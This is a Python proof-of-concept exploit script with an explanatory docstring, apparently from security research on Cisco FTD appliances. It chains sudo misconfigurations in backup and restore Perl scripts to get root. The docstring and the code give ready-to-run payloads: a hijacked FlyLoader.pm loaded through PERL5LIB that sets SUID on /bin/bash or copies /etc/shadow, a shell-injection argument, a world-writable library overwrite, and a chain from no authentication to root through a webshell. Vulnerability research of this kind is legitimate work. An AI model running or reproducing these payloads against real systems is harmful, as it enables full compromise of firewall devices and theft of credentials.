"""
F-FTD-70: Root code execution via sf-backup.pl + sf-restore-backup.pl shell injection + PERL5LIB hijack
CONTROLLED ENVIRONMENT ONLY

Root cause:
  /etc/sudoers:
    www ALL = NOPASSWD:SETENV: /usr/local/sf/bin/sf-backup.pl
    www ALL = NOPASSWD:SETENV: /usr/local/sf/bin/sf-restore-backup.pl
    Defaults env_keep += "PERL5LIB LD_LIBRARY_PATH PYTHONPATH ..."

  Both scripts run as root (sudo NOPASSWD).
  SETENV = environment NOT reset — PERL5LIB, LD_LIBRARY_PATH survive sudo.
  The scripts contain unquoted/shell-interpolated system() calls with attacker-controlled args.

ATTACK VECTOR A — PERL5LIB module hijack (cleanest, works on both scripts):

  Both sf-backup.pl and sf-restore-backup.pl begin with:
    use FlyLoader;   ← non-standard Cisco Perl module, not in CPAN
    use Data::Dumper;
    use Sys::Syslog;
    use SF::sfnotify;

  Perl module resolution order: PERL5LIB dirs first, then @INC system paths.
  With SETENV + PERL5LIB in env_keep:
    1. www writes a fake FlyLoader.pm to a www-writable /tmp directory
    2. Sets PERL5LIB=/tmp/attacker-lib in environment
    3. Runs: PERL5LIB=/tmp/attacker-lib sudo /usr/local/sf/bin/sf-backup.pl dummy
    4. Perl (running as root) finds /tmp/attacker-lib/FlyLoader.pm before system paths
    5. Executes attacker-controlled Perl code as root

  Payload FlyLoader.pm:
    package FlyLoader;
    use POSIX;
    chmod("u+s", "/bin/bash");   # or: system("chmod u+s /bin/bash")
    1;

  After: /bin/bash -p → effective uid = root.

  Why this works:
  - sudo SETENV disables the default env_reset for these specific entries
  - PERL5LIB is in env_keep → also preserved (belt + suspenders)
  - FlyLoader is not in CPAN — Perl HAS to find it in @INC/PERL5LIB
  - The module is loaded immediately at script startup (line 6 of sf-backup.pl)
  - No command-line arguments needed — dummy arg bypasses "no argument" issues

ATTACK VECTOR B — command injection via $tarfile argument:

  sf-backup.pl:
    my $tarfile = shift @ARGV;  ← attacker-controlled
    ...child process:
    exec("/usr/local/sf/bin/sf-backup-inator.pl \"$tarfile\"");  ← single-string exec = sh -c

  sf-restore-backup.pl:
    $tarfile = shift @args;  ← attacker-controlled
    if ($tarfile !~ /^\//) { $tarfile = abs_path($tarfile); }  ← abs_path NOT called for absolute paths!
    ...
    system("/bin/tar xf \"$tarfile\" --directory=\"$untar_dir\" --occurrence ..."); ← line 148
    system("/bin/tar xf \"$tarfile\" --directory=\"$untar_dir\" --occurrence ..."); ← line 480
    system("/bin/tar xf \"$tarfile\" --directory=\"$untar_dir\" --occurrence ..."); ← line 512

  Perl single-string exec() / system() behavior:
    If string contains shell metacharacters (;, |, $, `), Perl invokes /bin/sh -c <string>.
    The double-quotes around $tarfile in the string do NOT prevent injection if $tarfile contains '"'.

  Payload argument:
    /tmp/x"; chmod u+s /bin/bash; echo "
  Expands to (sh -c target):
    /bin/tar xf "/tmp/x"; chmod u+s /bin/bash; echo "" --directory="/tmp/"...
  Shell executes:
    1. /bin/tar xf "/tmp/x"        → fails (no such file)
    2. chmod u+s /bin/bash         → SUID bash set (as root)
    3. echo ""                     → harmless

  Notes:
  - sf-restore-backup.pl has 3 separate injection points (lines 148, 480, 512), all before
    deep restore logic runs
  - sf-backup.pl injection is in child exec() path; requires sf-backup-inator.pl to exist
  - The check `if ($tarfile !~ /^\//)` avoids abs_path only for absolute paths — supply /tmp/...

ATTACK VECTOR C — libnavl.so.4.0 chmod 777 during restore (secondary):

  sf-restore-backup.pl line 1497:
    system ( "chmod 777 /ngfw/var/sf/lib64/navl/libnavl.so.4.0" );
  Executed unconditionally during restoreFiles() if the navl library exists.
  After running sf-restore-backup.pl (even with a dummy/truncated backup):
    - /ngfw/var/sf/lib64/navl/libnavl.so.4.0 becomes world-writable
    - www overwrites it with a malicious .so
    - Next root process that dlopen()s libnavl → attacker code as root
  Requires: knowing what loads libnavl (SFDataCorrelator, sfmbservice, or lina candidates)
  Less clean than V-A/V-B — requires secondary trigger.

COMPLETE PRE-AUTH TO ROOT CHAIN (using V-A):
  Step 1: F-FTD-60 (pre-auth) → admin credentials on FDM
  Step 2: F-FTD-67 (config import zip-slip) → write JSP to Tomcat webroot as www
  Step 3: Trigger JSP via HTTP → www shell
  Step 4: sudo sf-backup.pl with PERL5LIB hijack → root

  Alternatively after zip-slip:
  Step 3b: F-FTD-69 (V1) → sudo chmod u+s /bin/bash → root (faster, 1 cmd)

Affected: FTD 6.7.0-65 (verified from sf-backup.pl 4293 bytes, sf-restore-backup.pl 99492 bytes)
Auth required: www shell (sudoers is the vuln)
"""

# CONTROLLED ENVIRONMENT ONLY

import subprocess
import os
import sys


ATTACKER_PLLIB = "/tmp/ftd70-evilpllib"

FLYLOADER_PAYLOAD_SUID = '''package FlyLoader;
use POSIX;
chmod("u+s", "/bin/bash");
open(my $fh, ">", "/tmp/ftd70-flyloader.proof") or die;
print $fh "FlyLoader.pm executed as UID " . $> . "\\n";
close $fh;
1;
'''

FLYLOADER_PAYLOAD_SHADOW = '''package FlyLoader;
use File::Copy;
copy("/etc/shadow", "/tmp/ftd70-shadow.exfil");
chmod(0644, "/tmp/ftd70-shadow.exfil");
open(my $fh, ">", "/tmp/ftd70-flyloader.proof") or die;
print $fh "FlyLoader.pm executed as UID " . $> . "\\n";
close $fh;
1;
'''


def vector_a_perl5lib_hijack(script="backup", payload="suid"):
    """
    V-A: PERL5LIB module hijack via env_keep + SETENV.
    Writes fake FlyLoader.pm, runs sudo script with PERL5LIB override.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print("[*] V-A: PERL5LIB FlyLoader module hijack")
    print(f"    Script: sf-{script}.pl | Payload: {payload}")

    os.makedirs(ATTACKER_PLLIB, exist_ok=True)

    pl_payload = FLYLOADER_PAYLOAD_SUID if payload == "suid" else FLYLOADER_PAYLOAD_SHADOW
    flyloader_path = os.path.join(ATTACKER_PLLIB, "FlyLoader.pm")
    with open(flyloader_path, "w") as f:
        f.write(pl_payload)
    os.chmod(flyloader_path, 0o644)

    print(f"[*] FlyLoader.pm written to {flyloader_path}")
    print(f"    Payload:\n{pl_payload}")

    env = os.environ.copy()
    env["PERL5LIB"] = ATTACKER_PLLIB

    script_path = f"/usr/local/sf/bin/sf-{script}.pl"
    cmd = ["sudo", script_path, "dummy"]
    print(f"[*] Running: PERL5LIB={ATTACKER_PLLIB} {' '.join(cmd)}")

    result = subprocess.run(cmd, env=env, capture_output=True, text=True)
    print(f"[*] Exit: {result.returncode}")
    print(f"    stdout: {result.stdout[:300]}")
    print(f"    stderr: {result.stderr[:300]}")

    if os.path.exists("/tmp/ftd70-flyloader.proof"):
        with open("/tmp/ftd70-flyloader.proof") as f:
            proof = f.read().strip()
        print(f"[!] CONFIRMED: FlyLoader.pm executed as root")
        print(f"    Proof: {proof}")

        if payload == "suid":
            stat = subprocess.run(["ls", "-la", "/bin/bash"], capture_output=True, text=True)
            print(f"[*] /bin/bash: {stat.stdout.strip()}")
        elif payload == "shadow" and os.path.exists("/tmp/ftd70-shadow.exfil"):
            with open("/tmp/ftd70-shadow.exfil") as f:
                print(f"[!] /etc/shadow exfiltrated:\n{f.read()[:500]}")

        return True

    print("[-] Proof file not found — module may not have been loaded from PERL5LIB")
    return False


def vector_b_arg_injection(script="restore"):
    """
    V-B: Command injection via $tarfile argument in system() single-string call.
    sf-restore-backup.pl: system("/bin/tar xf \"$tarfile\" ...") at lines 148/480/512.
    sf-backup.pl: exec("/usr/local/sf/bin/sf-backup-inator.pl \"$tarfile\"")
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] V-B: $tarfile command injection in sf-{script}.pl")

    injection = '/tmp/x"; chmod u+s /bin/bash; echo "'
    print(f"    Injection payload: {repr(injection)}")
    print(f"    Expands to: /bin/tar xf \"{injection}\" ...")
    print(f"    Shell executes: <fail>; chmod u+s /bin/bash; echo ...")

    if script == "restore":
        script_path = "/usr/local/sf/bin/sf-restore-backup.pl"
    else:
        script_path = "/usr/local/sf/bin/sf-backup.pl"

    print(f"    Command: sudo {script_path} '{injection}'")
    result = subprocess.run(["sudo", script_path, injection],
                            capture_output=True, text=True, timeout=30)
    print(f"[*] Exit: {result.returncode}")

    stat = subprocess.run(["ls", "-la", "/bin/bash"], capture_output=True, text=True)
    if "s" in stat.stdout.split()[0]:
        print(f"[!] CONFIRMED: SUID set on /bin/bash — root via /bin/bash -p")
        print(f"    {stat.stdout.strip()}")
        return True
    else:
        print(f"[-] No SUID set. Output: {result.stderr[:200]}")
        return False


def vector_c_libnavl_chmod(check_only=False):
    """
    V-C: sf-restore-backup.pl line 1497 chmod 777 libnavl.so.4.0.
    After restore runs, libnavl.so.4.0 is world-writable.
    www can then overwrite it with a malicious .so.
    CONTROLLED ENVIRONMENT ONLY.
    """
    libnavl = "/ngfw/var/sf/lib64/navl/libnavl.so.4.0"
    print(f"[*] V-C: libnavl.so.4.0 chmod 777 via restore script")
    print(f"    Target: {libnavl}")

    if check_only:
        stat = subprocess.run(["ls", "-la", libnavl], capture_output=True, text=True)
        if stat.returncode == 0:
            print(f"[*] Current permissions: {stat.stdout.strip()}")
            perms = stat.stdout.split()[0]
            if "other" in perms or perms.endswith("rwxrwxrwx"):
                print(f"[!] libnavl.so.4.0 is world-writable — restore has already run or V-C is active")
            else:
                print(f"[-] Not world-writable yet (run sf-restore-backup.pl to trigger)")
        else:
            print(f"[-] File not found at {libnavl}")
        return

    print("[*] Note: Running sf-restore-backup.pl with a dummy file to trigger chmod 777")
    print("    This requires a real (or minimal) backup file path as ARGV[0]")
    print("    V-A (PERL5LIB) is cleaner — use that instead unless specifically testing V-C")


if __name__ == "__main__":
    print("=" * 70)
    print("F-FTD-70: Root exec via sf-backup/restore shell injection + PERL5LIB hijack")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)
    print("""
Sudoers surface:
  www ALL = NOPASSWD:SETENV: /usr/local/sf/bin/sf-backup.pl        (no args restriction)
  www ALL = NOPASSWD:SETENV: /usr/local/sf/bin/sf-restore-backup.pl (no args restriction)
  Defaults env_keep += "PERL5LIB LD_LIBRARY_PATH ..."

V-A (PERL5LIB FlyLoader hijack) — fastest, works without arg injection:
  mkdir -p /tmp/ftd70-evilpllib
  echo 'package FlyLoader; system("chmod u+s /bin/bash"); 1;' > /tmp/ftd70-evilpllib/FlyLoader.pm
  PERL5LIB=/tmp/ftd70-evilpllib sudo /usr/local/sf/bin/sf-backup.pl dummy
  → Perl loads FlyLoader.pm from /tmp/ftd70-evilpllib/ as root at startup
  → chmod u+s /bin/bash; /bin/bash -p → root

V-B ($tarfile arg injection) — system() single-string shell in sf-restore-backup.pl:
  sudo /usr/local/sf/bin/sf-restore-backup.pl '/tmp/x"; chmod u+s /bin/bash; echo "/'
  → system("/bin/tar xf \\"/tmp/x\\"; chmod u+s /bin/bash; echo \\"/"...)
  → chmod runs as root (lines 148, 480, 512 — three independent injection points)

V-C (libnavl chmod 777) — secondary .so hijack path after restore trigger.
""")

    mode = sys.argv[1] if len(sys.argv) > 1 else "static"

    if mode == "vA":
        script = sys.argv[2] if len(sys.argv) > 2 else "backup"
        payload = sys.argv[3] if len(sys.argv) > 3 else "suid"
        vector_a_perl5lib_hijack(script, payload)

    elif mode == "vB":
        script = sys.argv[2] if len(sys.argv) > 2 else "restore"
        vector_b_arg_injection(script)

    elif mode == "vC":
        vector_c_libnavl_chmod(check_only=(len(sys.argv) < 3 or sys.argv[2] != "trigger"))

    elif mode == "static":
        print("--- Static analysis: injection surfaces in backup/restore scripts ---")
        print("""
sf-backup.pl (4293 bytes, /usr/local/sf/bin/):
  Line 6:  use FlyLoader;                    ← PERL5LIB hijack point
  Child:   exec("/usr/local/sf/bin/sf-backup-inator.pl \\"$tarfile\\"")  ← single-string exec
           $tarfile = shift @ARGV — no sanitization — shell metacharacters inject commands

sf-restore-backup.pl (99492 bytes, /usr/local/sf/bin/):
  Line 6:  use FlyLoader;                    ← PERL5LIB hijack point
  Line 148: system("/bin/tar xf \\"$tarfile\\" ...") ← verifyInitiator()
  Line 480: system("/bin/tar xf \\"$tarfile\\" ...") ← verifyBackupImage()
  Line 512: system("/bin/tar xf \\"$tarfile\\" ...") ← second check in verifyBackupImage()
  Line 1497: system("chmod 777 /ngfw/var/sf/lib64/navl/libnavl.so.4.0")  ← world-writable .so
  All three system() calls at 148/480/512: $tarfile from @ARGV, absolute paths bypass abs_path().

Perl single-string system()/exec() behavior:
  Perl checks if string has shell metacharacters (;|&$`<>).
  If YES: invokes /bin/sh -c <string>. No quoting inside the string prevents this.
  Double-quotes around $tarfile in the string are shell quotes, not Perl quotes.

Most reliable path: V-A (PERL5LIB) — no timing, no branch conditions, executes at module load.
""")

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
